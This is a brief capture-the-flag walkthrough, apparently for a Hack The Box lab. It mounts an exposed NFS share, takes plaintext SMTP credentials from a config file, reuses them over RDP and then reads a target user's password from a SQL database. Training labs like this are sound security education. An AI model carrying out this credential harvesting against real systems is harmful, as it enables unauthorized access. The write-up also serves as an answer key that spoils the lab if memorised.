### Context

```
This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.
```

### Question 
Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.

### Solution
We know user HTB exists.

```shell
Mount NFS Share:
> showmount -e 10.129.202.41
> sudo mount -t nfs 10.129.158.204:/TechSupport ./target-nfs/ -o nolock

> sudo su
> cd target-nfs
> ls -la *
 smtp {
     host=smtp.web.dev.inlanefreight.htb
     #port=25
     ssl=true
     user="alex"
     password="lol123!mD"
     from="alex.g@web.dev.inlanefreight.htb"
 }
 
 > xfreerdp /v:10.129.2.59 /u:alex /p:'lol123!mD'
 Click on SQL app  on Desktop as Administrator and enter the password we can find in users\alex\devshare\important
then find the db and right click select 1000 rows then find HTB password. 
```